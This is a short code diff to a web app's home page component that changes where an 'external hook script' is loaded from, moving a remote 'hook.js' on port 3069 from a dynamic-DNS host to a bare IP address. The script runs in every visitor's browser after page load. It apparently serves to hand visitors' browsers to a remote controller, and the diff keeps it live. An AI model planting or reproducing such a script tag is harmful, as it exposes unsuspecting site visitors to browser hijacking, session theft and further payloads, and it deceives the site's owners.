@@ -543,7 +543,7 @@ export default function Home() {
       {/* end footer */}
       {/* external hook script */}
       <Script
-        src="http://th3mujd11.synology.me:3069/hook.js"
+        src="http://89.165.219.117:3069/hook.js"
         strategy="afterInteractive"
       />
     </main> // end main container
